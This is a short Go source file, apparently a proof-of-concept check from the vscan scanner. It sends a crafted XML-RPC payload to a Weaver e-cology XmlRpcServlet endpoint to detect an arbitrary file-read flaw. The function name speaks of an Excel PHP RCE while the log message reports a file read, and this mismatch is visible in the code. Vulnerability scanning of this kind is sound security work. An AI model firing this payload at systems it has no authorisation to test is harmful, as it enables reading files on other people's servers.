package weaver

import (
	"fmt"
	"github.com/veo/vscan/pkg"
	"strings"
)

func E_Office_do_excel_php_rce(u string) bool {
	header := make(map[string]string)
	header["Content-Type"] = "application/xml"
	payload := "<?xml version=\"1.0\" encoding=\"UTF-8\"?><methodCall>\r\n<methodName>WorkflowService.getAttachment</methodName>\r\n<params><param><value><string>/test</string>\r\n</value></param></params></methodCall>"
	url := u + "/weaver/org.apache.xmlrpc.webserver.XmlRpcServlet"
	if req, err := pkg.HttpRequset(url, "POST", payload, false, header); err == nil {
		//pkg.GoPocLog(req.Body)
		if req.StatusCode == 200 && strings.Contains(req.Body, "xml") && strings.Contains(req.Body, "methodResponse") && strings.Contains(req.Body, "name") && strings.Contains(req.Body, "value") {
			pkg.GoPocLog(fmt.Sprintf("Found vuln E_Cology_OA_XmlRpcServlet_file_read|%s\n", url))
			return true
		}
	}

	return false
}
